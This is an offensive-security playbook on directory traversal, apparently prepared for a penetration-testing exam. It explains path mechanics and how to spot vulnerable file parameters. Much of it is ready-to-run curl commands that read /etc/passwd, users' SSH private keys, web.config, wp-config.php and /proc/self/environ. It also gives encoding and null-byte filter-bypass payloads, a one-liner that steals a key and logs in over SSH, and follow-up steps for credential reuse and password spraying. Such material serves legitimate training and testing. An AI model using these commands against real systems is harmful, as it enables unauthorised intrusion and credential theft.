# Directory Traversal (Path Traversal)

## TL;DR
Directory traversal exploits a web application's failure to sanitise file
path input. When an application accepts a filename or path as a parameter
and passes it directly to the filesystem, you can inject `../` sequences
to escape the web root and read arbitrary files anywhere on the server.
On Linux this leads directly to `/etc/passwd` → SSH key theft → shell.
On Windows it leads to config files and logs containing credentials.
When plain `../` is filtered, URL-encode the dots: `%2e%2e/`.

---

## Understanding Paths — The Foundation

Before exploiting path traversal, you need to understand how filesystems
reference files. Two systems exist and you will use both during exploitation.

### Absolute Paths

An absolute path specifies the **complete location** of a file from the
root of the filesystem. It always starts with `/` on Linux or a drive
letter on Windows. It is the same regardless of where you currently are.

```
Linux:   /etc/passwd
         /home/offsec/.ssh/id_rsa
         /var/www/html/config.php

Windows: C:\Windows\System32\drivers\etc\hosts
         C:\inetpub\wwwroot\web.config
         C:\inetpub\logs\LogFiles\W3SVC1\
```

### Relative Paths

A relative path specifies a location **relative to the current directory**.
`../` means "go up one directory level". Chaining them climbs the tree:

```
Current directory: /var/www/html/cms/

../                     → /var/www/html/
../../                  → /var/www/
../../../               → /var/
../../../../            → /
../../../../etc/passwd  → /etc/passwd
```

**The key property for exploitation:** Once you reach the root (`/`),
additional `../` sequences have no effect. The filesystem cannot go higher
than root. This means you can add as many `../` sequences as you want —
excess ones are silently ignored:

```
../../../../../../../../../etc/passwd   → /etc/passwd
```

Using a large number (10+) of `../` sequences guarantees you reach root
regardless of how deep the application's working directory is — you do not
need to know the exact depth.

---

## What is Directory Traversal?

Web servers serve files from a designated **web root directory**:

```
Linux default:   /var/www/html/
Windows IIS:     C:\inetpub\wwwroot\
```

When a browser requests `http://target.com/page.html`, the server maps
this to `/var/www/html/page.html`. The web root acts as a sandbox — users
should only be able to access files inside it.

**The vulnerability:** When a web application takes a filename or path as
a parameter and passes it to the filesystem without sanitisation, an attacker
can inject `../` sequences to escape the web root sandbox:

```
Intended:   ?page=about.html   →   /var/www/html/about.html
Attacked:   ?page=../../../etc/passwd   →   /etc/passwd
```

The application built the file path by concatenating its base directory
with your input. By injecting `../`, you redirected it to a file outside
the web root.

**Why this exists:** Developers often build file-serving logic like this:

```php
// Vulnerable PHP
$page = $_GET['page'];
include('/var/www/html/cms/' . $page);
```

No validation. No sanitisation. Whatever you put in `page` gets appended
to the base path and served.

---

## Phase 1 — Identifying Traversal Entry Points

### URL Parameters That Reference Files

The highest-signal indicator of a potential traversal vulnerability is a
URL parameter whose value is a **filename or page name**:

```
http://target.com/index.php?page=about.html       ← file parameter
http://target.com/view.php?file=report.pdf        ← file parameter
http://target.com/index.php?language=en.html      ← file parameter
http://target.com/cms/show.php?template=home      ← template = likely file
http://target.com/download.php?name=brochure.pdf  ← file parameter
```

These patterns strongly suggest the application is reading a file from
disk based on your input.

### Extracting Intel From the URL

When you find a file parameter URL, extract everything it tells you:

```
https://target.com/cms/index.php?page=admin.php

Insight 1: /cms/ subdirectory → app runs in a subdirectory, not web root
Insight 2: index.php → PHP backend confirmed
Insight 3: ?page= parameter with a .php value → likely including PHP files
Insight 4: Try navigating directly: https://target.com/cms/admin.php
           → if it loads the same content, the parameter IS including files
```

### Browsing to Confirm File Inclusion

If `?page=admin.php` loads content, navigate to `admin.php` directly:

```
http://target.com/cms/index.php?page=admin.php
vs
http://target.com/cms/admin.php
```

If both show the same content → the `page` parameter is directly including
files → highly likely traversal vulnerable.

### What to Look For While Browsing

```
Hover over all links → check URL bar for file parameters
View page source → look for file paths in links and forms
Check all buttons → some only reveal parameters on hover
Look at form action URLs → may contain file references
Note any URL with: page=, file=, template=, lang=, doc=, path=, view=
```

---

## Phase 2 — Exploiting Directory Traversal

### Linux Targets — Standard Exploitation Sequence

**Always use curl, not browser**, for traversal exploitation. Browsers
attempt to render HTML and reformat output, making SSH keys and config
files unreadable. curl returns raw content.

```bash
# Step 1 — Confirm vulnerability with /etc/passwd
# Use excessive ../ to guarantee reaching root regardless of depth
curl "http://<TARGET_IP>/cms/index.php?page=../../../../../../../../../etc/passwd"

# Step 2 — If it works, /etc/passwd output confirms:
# - OS is Linux
# - List of usernames (left side of each colon-separated line)
# - Home directories (6th field) — tells you where SSH keys live
# - Which users have real shells (last field — bash/sh/zsh = real user)

# Step 3 — Extract users with real shells from passwd
curl -s "http://<TARGET_IP>/cms/index.php?page=../../../../../../../../../etc/passwd" \
  | grep -v "nologin\|false\|sync" | cut -d: -f1,6,7

# Step 4 — For each real user found, try to read their SSH private key
curl "http://<TARGET_IP>/cms/index.php?page=../../../../../../../../../home/<USER>/.ssh/id_rsa"

# Step 5 — Save the key cleanly
curl -s "http://<TARGET_IP>/cms/index.php?page=../../../../../../../../../home/<USER>/.ssh/id_rsa" \
  > /tmp/<USER>_id_rsa

# Step 6 — Fix permissions (SSH refuses keys with open permissions)
chmod 600 /tmp/<USER>_id_rsa

# Step 7 — Connect
ssh -i /tmp/<USER>_id_rsa <USER>@<TARGET_IP>

# If non-standard SSH port
ssh -i /tmp/<USER>_id_rsa -p <PORT> <USER>@<TARGET_IP>
```

### Reading /etc/passwd — What to Extract

```
root:x:0:0:root:/root:/bin/bash          ← root, home: /root
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  ← system, skip
www-data:x:33:33::/var/www:/usr/sbin/nologin     ← web server user
offsec:x:1000:1000::/home/offsec:/bin/bash       ← real user, home: /home/offsec

Format: username:password:UID:GID:comment:home_directory:shell
Field 6 = home directory → .ssh/id_rsa lives here
Field 7 = shell → nologin/false = service account; bash/sh/zsh = real user
```

---

### Windows Targets — Standard Exploitation Sequence

Windows uses backslashes for paths (`\`), but URLs use forward slashes.
Try both — some Windows applications only respond to one or the other.

**Step 1 — Confirm vulnerability**

```bash
# Standard confirmation file — readable by all users on Windows
# Forward slash variant
curl "http://<TARGET_IP>/index.php?page=../../../../../../../../../Windows/System32/drivers/etc/hosts"

# Backslash variant (URL-encoded backslash = %5c)
curl "http://<TARGET_IP>/index.php?page=..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts"
```

**Step 2 — High-value Windows files to target**

```bash
# IIS web server configuration — frequently contains credentials
curl "http://<TARGET_IP>/index.php?page=../../../../../../../../../inetpub/wwwroot/web.config"

# IIS logs — may reveal usernames, requests, application paths
curl "http://<TARGET_IP>/index.php?page=../../../../../../../../../inetpub/logs/LogFiles/W3SVC1/u_ex<YYMMDD>.log"

# Windows hosts file (confirmation target)
curl "http://<TARGET_IP>/index.php?page=../../../../../../../../../Windows/System32/drivers/etc/hosts"

# SAM database hint files (rarely readable but worth trying)
curl "http://<TARGET_IP>/index.php?page=../../../../../../../../../Windows/System32/config/SAM"

# Application config files — vary by app, research paths for detected tech
curl "http://<TARGET_IP>/index.php?page=../../../../../../../../../xampp/apache/conf/httpd.conf"
```

**Windows target file reference:**

| File | Contains | Path |
|---|---|---|
| hosts | Network config confirmation | `C:\Windows\System32\drivers\etc\hosts` |
| web.config | IIS app config, often credentials | `C:\inetpub\wwwroot\web.config` |
| IIS logs | Request logs, paths, users | `C:\inetpub\logs\LogFiles\W3SVC1\` |
| php.ini | PHP configuration | `C:\php\php.ini` or `C:\xampp\php\php.ini` |
| my.ini | MySQL credentials | `C:\xampp\mysql\bin\my.ini` |
| httpd.conf | Apache config | `C:\xampp\apache\conf\httpd.conf` |

---

## Phase 3 — Bypassing Traversal Filters

When plain `../` is blocked, the application is filtering the traversal
sequence. Multiple bypass techniques exist — try them in order.

### Bypass 1 — URL Encoding (Most Common Bypass)

**What URL encoding is:** URLs can only contain certain ASCII characters.
Special characters must be encoded as `%XX` where XX is the hex ASCII code.
Dots (`.`) encode as `%2e`.

**Why this bypasses filters:** Many filters check for the literal string
`../` in the raw input. When you encode the dots, the filter sees `%2e%2e/`
and does not recognise it as a traversal sequence. The web server/application
decodes it back to `../` before processing, so the traversal still works.

```bash
# Encoded dots — most reliable bypass
# . = %2e  so  ../ = %2e%2e/
curl "http://<TARGET_IP>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Double-encoded dots (bypasses double-decode filters)
# %2e → %252e (encode the % sign as %25)
curl "http://<TARGET_IP>/cgi-bin/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
```

### Bypass 2 — Mixed Encoding Variations

```bash
# Encode only the forward slash
# / = %2f  so  ../ = ..%2f
curl "http://<TARGET_IP>/page?file=..%2f..%2f..%2fetc%2fpasswd"

# Encode everything
# ../ = %2e%2e%2f
curl "http://<TARGET_IP>/page?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Mix encoded and plain
curl "http://<TARGET_IP>/page?file=%2e%2e/../%2e%2e/../etc/passwd"
```

### Bypass 3 — Backslash Variants (Windows + Some Linux)

```bash
# Backslash as separator
curl "http://<TARGET_IP>/page?file=..\..\..\etc\passwd"

# URL-encoded backslash: \ = %5c
curl "http://<TARGET_IP>/page?file=..%5c..%5c..%5cetc%5cpasswd"

# Mixed forward and backslash
curl "http://<TARGET_IP>/page?file=..\/..\/etc/passwd"
```

### Bypass 4 — Null Byte (Older PHP Applications)

Some older PHP applications append a file extension to your input:
```php
include('/var/www/html/' . $_GET['page'] . '.php');
```

If you request `?page=../../../../etc/passwd`, the app looks for
`/etc/passwd.php` which does not exist. The null byte `%00` terminates
the string in C-based applications, truncating the `.php`:

```bash
# Null byte termination — works on PHP < 5.3.4
curl "http://<TARGET_IP>/index.php?page=../../../../../etc/passwd%00"
```

### Bypass 5 — Filter Stripping Bypass

Some filters strip `../` from the input once. If you double the sequence,
stripping once leaves a valid traversal:

```bash
# ....// → after stripping ../ → ../
curl "http://<TARGET_IP>/index.php?page=....//....//....//etc/passwd"

# ..././ → after stripping ./ → ../
curl "http://<TARGET_IP>/index.php?page=..././..././..././etc/passwd"
```

---

## Linux High-Value Target Files — Complete Reference

```bash
# Always check first — user enumeration
/etc/passwd

# Shadow file — hashed passwords (usually requires root access)
/etc/shadow

# SSH private keys — for each user found in /etc/passwd
/home/<USER>/.ssh/id_rsa
/root/.ssh/id_rsa

# SSH authorised keys (reveals what public keys can log in)
/home/<USER>/.ssh/authorized_keys
/root/.ssh/authorized_keys

# Web application config files — often contain DB credentials
/var/www/html/config.php
/var/www/html/wp-config.php          ← WordPress DB credentials
/var/www/html/configuration.php      ← Joomla DB credentials
/var/www/html/sites/default/settings.php  ← Drupal DB credentials

# Web server configuration
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default

# System logs — may reveal usernames, paths, errors
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log                    ← SSH login attempts, usernames

# Environment and process info
/proc/self/environ                   ← current process environment variables
/proc/self/cmdline                   ← command that started the web server

# SSH daemon config
/etc/ssh/sshd_config

# Crontabs — scheduled tasks, may reveal scripts and paths
/etc/crontab
/var/spool/cron/crontabs/root
```

---

## Using Burp for Traversal Testing

Burp Repeater is more efficient than curl for iterating through bypass
techniques — you can modify and resend without retyping the full URL:

```
1. Browse to the target page in Firefox (Burp proxying)
2. Proxy → HTTP History → find the request with the file parameter
3. Right-click → Send to Repeater
4. In Repeater: modify the parameter value → Send → read response
5. Iterate: change ../ to %2e%2e/ → Send → compare
```

**Burp Intruder for automated bypass testing:**

```
1. Send the request to Intruder
2. Highlight the path value → Add §
3. Payloads: paste a list of traversal bypass variants
4. Attack → look for responses with different size (= found a file)
```

---

## Exam-Day Traversal Workflow

```bash
# 1. Identify the parameter (URL inspection while browsing)
#    Look for: ?page=, ?file=, ?path=, ?template=, ?lang=, ?doc=

# 2. Confirm with /etc/passwd (Linux) or hosts file (Windows)
curl "http://<TARGET_IP>/path?<PARAM>=../../../../../../../../../etc/passwd"

# 3. If plain traversal blocked — try URL encoding
curl "http://<TARGET_IP>/path?<PARAM>=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 4. Parse /etc/passwd for real users
curl -s "http://<TARGET_IP>/path?<PARAM>=../../../../../../../../../etc/passwd" \
  | grep -v "nologin\|false" | cut -d: -f1,6

# 5. Try SSH key for each real user
curl -s "http://<TARGET_IP>/path?<PARAM>=../../../../../../../../../home/<USER>/.ssh/id_rsa" \
  > /tmp/<USER>_key

# 6. Check if key was retrieved (non-empty file)
wc -c /tmp/<USER>_key

# 7. Fix permissions and connect
chmod 600 /tmp/<USER>_key
ssh -i /tmp/<USER>_key <USER>@<TARGET_IP>
ssh -i /tmp/<USER>_key -p <PORT> <USER>@<TARGET_IP>

# 8. If no SSH key — try config files for credentials
curl "http://<TARGET_IP>/path?<PARAM>=../../../../../../../../../var/www/html/wp-config.php"
curl "http://<TARGET_IP>/path?<PARAM>=../../../../../../../../../var/www/html/config.php"
```

---

## Encoding Quick Reference

| Character | URL Encoded | Double Encoded |
|---|---|---|
| `.` (dot) | `%2e` | `%252e` |
| `/` (forward slash) | `%2f` | `%252f` |
| `\` (backslash) | `%5c` | `%255c` |
| null byte | `%00` | N/A |

**Complete encoded traversal sequences:**

```
Plain:          ../
Dots encoded:   %2e%2e/
All encoded:    %2e%2e%2f
Double encoded: %252e%252e%252f
Backslash:      ..\
Backslash enc:  ..%5c
```

---

## Gotchas & Exam Tips

- **Never use the browser for reading sensitive files.** Browsers render
  HTML — SSH keys get mangled, config files lose formatting, binary data
  is unreadable. Always curl for clean output.

- **Use excessive `../` sequences.** 10+ sequences always reaches root
  regardless of how deep the webroot is. `../../../../../../../../` is
  safer than counting directories precisely.

- **`chmod 600` the key before SSH.** SSH refuses to use private keys
  with permissions wider than owner-readable. The error `UNPROTECTED
  PRIVATE KEY FILE` means the permissions are wrong, not the key. Always
  `chmod 600` before attempting connection.

- **When plain traversal fails, immediately try `%2e%2e/`.** This single
  encoding bypass succeeds against the majority of simple filters. On the
  exam, filters are usually simple — one encoding level is enough.

- **`/etc/passwd` with readable content = traversal confirmed.** Even if
  you cannot find SSH keys, reading passwd confirms the vulnerability and
  gives you usernames for other attack vectors (password spraying, SSH
  brute force, application login).

- **Windows traversal needs both slash types.** Some Windows apps only
  respond to `\` (backslash) traversal. When `/` fails on a Windows
  target, try `\` and its encoded form `%5c`.

- **web.config on IIS is always worth trying.** It frequently contains
  database connection strings with plaintext credentials, or application
  secrets that re-use the system password.

- **Log files can confirm path depth.** If you can read Apache/Nginx
  access logs (`/var/log/apache2/access.log`), the paths of previous
  requests reveal the web application's directory structure, helping you
  calculate exact traversal depth.

- **`/proc/self/environ` leaks server variables.** On Linux, this file
  contains environment variables of the running web server process —
  sometimes including `DB_PASSWORD`, API keys, or `DOCUMENT_ROOT` which
  tells you the exact web root path.

---

## Quick Reference — Commands

```bash
# Linux confirmation
curl "http://<TARGET>/<PATH>?<PARAM>=../../../../../../../../../etc/passwd"

# Linux with URL encoding
curl "http://<TARGET>/<PATH>?<PARAM>=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Linux SSH key theft
curl -s "http://<TARGET>/<PATH>?<PARAM>=../../../../../../../../../home/<USER>/.ssh/id_rsa" \
  > /tmp/key && chmod 600 /tmp/key && ssh -i /tmp/key <USER>@<TARGET>

# Windows confirmation
curl "http://<TARGET>/<PATH>?<PARAM>=../../../../../../../../../Windows/System32/drivers/etc/hosts"

# Windows IIS config
curl "http://<TARGET>/<PATH>?<PARAM>=../../../../../../../../../inetpub/wwwroot/web.config"

# WordPress config (DB credentials)
curl "http://<TARGET>/<PATH>?<PARAM>=../../../../../../../../../var/www/html/wp-config.php"

# Extract real users from passwd
curl -s "http://<TARGET>/<PATH>?<PARAM>=../../../../../../../../../etc/passwd" \
  | grep -v "nologin\|false\|sync" | cut -d: -f1,6,7
```

---

## Next Steps After Directory Traversal

| Finding | Next Action |
|---|---|
| `/etc/passwd` readable | Extract users → try SSH keys for each |
| SSH private key obtained | `chmod 600 key` → `ssh -i key user@target` |
| `wp-config.php` readable | Extract DB credentials → test on login panels → credential reuse |
| `web.config` readable | Extract credentials → test on RDP, WinRM, SMB |
| Log files readable | Extract usernames from log entries → password spraying |
| `/proc/self/environ` readable | Extract DB passwords, API keys, document root path |
| Traversal confirmed but no SSH | Pivot to File Inclusion → `playbooks/file-inclusion.md` |
